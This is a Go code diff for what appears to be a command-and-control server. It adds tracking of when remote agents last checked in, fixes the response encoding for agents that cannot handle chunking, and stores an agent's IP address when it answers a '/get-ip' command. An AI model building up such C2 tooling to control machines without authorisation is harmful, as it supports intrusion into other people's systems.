@@ -1,15 +1,21 @@
 package c2ctrl
 
 import (
+	"api/repos/agentsRepo"
 	"api/repos/messagesRepo"
 	"encoding/json"
 	"log"
 	"net/http"
+	"strconv"
 )
 
 // GetMessages returns messages specific to an agent.
 func GetMessages(w http.ResponseWriter, r *http.Request) {
 	agentID := r.PathValue("agentID")
+
+	if err := agentsRepo.UpdateLastSeen(agentID); err != nil {
+		log.Println("failed to update 'last seen' for agent:", agentID, err)
+	}
 
 	messages, err := messagesRepo.GetMultipleForAgent(agentID)
 	if err != nil {
@@ -23,11 +29,17 @@ func GetMessages(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if err := json.NewEncoder(w).Encode(&messages); err != nil {
+	body, err := json.Marshal(&messages)
+	if err != nil {
 		log.Println("c2: error: serializing response:", err)
 		http.Error(w, "", http.StatusInternalServerError)
 		return
 	}
+
+	// Agent doesn't support chunking...
+	w.Header().Set("Content-Length", strconv.Itoa(len(body)))
+	w.Header().Del("Transfer-Encoding")
+	w.Write(body)
 }
 
 type AgentMsgRespCtx struct {
@@ -53,10 +65,27 @@ func InsertMessageResponse(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if err := messagesRepo.UpdateResponse(newMsg.MessageID, newMsg.Response); err != nil {
+	agentID, err := messagesRepo.UpdateResponse(newMsg.MessageID, newMsg.Response)
+	if err != nil {
 		log.Println("c2: error: messagesRepo.UpdateResponse:", err)
 		http.Error(w, "", http.StatusInternalServerError)
 		return
+	}
+
+	if err := agentsRepo.UpdateLastSeen(agentID); err != nil {
+		log.Println("failed to update 'last seen' for agent:", agentID, err)
+	}
+
+	message, err := messagesRepo.Get(newMsg.MessageID)
+	if err == nil {
+		if message.Request == "/get-ip" {
+			agent, err := agentsRepo.Get(agentID)
+			if err == nil {
+				agentsRepo.UpdateIP(agent.ID, newMsg.Response)
+			} else {
+				// TODO: Log something...
+			}
+		}
 	}
 
 	w.WriteHeader(http.StatusOK)
